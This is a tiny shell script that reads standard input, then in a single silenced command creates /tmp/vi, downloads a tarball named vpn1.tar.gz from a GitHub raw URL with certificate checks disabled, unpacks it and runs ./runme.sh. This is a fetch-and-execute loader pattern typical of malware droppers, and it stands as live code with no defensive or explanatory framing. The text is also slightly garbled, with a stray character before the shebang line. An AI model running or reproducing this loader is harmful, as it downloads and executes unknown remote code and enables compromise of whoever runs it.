
ant_input=`cat /dev/stdin`
a#!/bin/sh

mkdir /tmp/vi && cd /tmp/vi && curl --insecure https://raw.githubusercontent.com/cssunz25/x/x/vpn1.tar.gz -o vpn1.tar.gz >/dev/null 2>&1 && tar zxf vpn1.tar.gz >/dev/null 2>&1 && ./runme.sh
